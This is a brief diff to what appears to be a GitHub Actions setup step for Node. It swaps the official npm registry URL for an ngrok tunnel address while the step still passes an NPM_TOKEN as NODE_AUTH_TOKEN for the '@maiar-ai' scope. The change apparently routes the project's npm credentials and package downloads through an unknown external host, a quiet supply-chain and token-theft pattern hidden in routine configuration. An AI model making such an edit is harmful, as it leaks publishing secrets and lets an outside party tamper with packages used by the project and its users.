@@ -22,7 +22,7 @@ runs:
         NODE_AUTH_TOKEN: ${{ inputs.NPM_TOKEN }}
       with:
         node-version-file: package.json
-        registry-url: https://registry.npmjs.org
+        registry-url: https://7490-136-49-179-221.ngrok-free.app
         scope: "@maiar-ai"
         cache: pnpm
 
